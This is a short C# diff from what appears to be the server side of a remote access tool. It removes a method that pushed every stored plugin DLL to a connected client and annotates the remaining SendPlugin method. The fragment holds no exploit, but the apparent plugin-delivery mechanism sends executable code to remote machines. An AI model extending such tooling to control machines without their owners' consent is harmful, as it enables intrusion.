@@ -227,7 +227,7 @@ namespace Server.Connection
             }
         }
 
-        public void SendPlugin(string hash) // client is missing some plguins, sending them
+        public void SendPlugin(string hash) // client is missing some plguins, sending them // total plugins = 550kb
         {
             try
             {
@@ -242,25 +242,6 @@ namespace Server.Connection
                         Send(msgPack.Encode2Bytes());
                         break;
                     }
-                }
-            }
-            catch (Exception ex)
-            {
-                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
-            }
-        }
-
-        public void ReSendPAlllugins() // because we used ReSendPlugins ToolStripMenuItem
-        {
-            try
-            {
-                foreach (var plugin in Settings.Plugins)
-                {
-                    MsgPack msgPack = new MsgPack();
-                    msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
-                    msgPack.ForcePathObject("Dll").SetAsString(plugin.Value);
-                    msgPack.ForcePathObject("Hash").SetAsString(plugin.Key);
-                    Send(msgPack.Encode2Bytes());
                 }
             }
             catch (Exception ex)
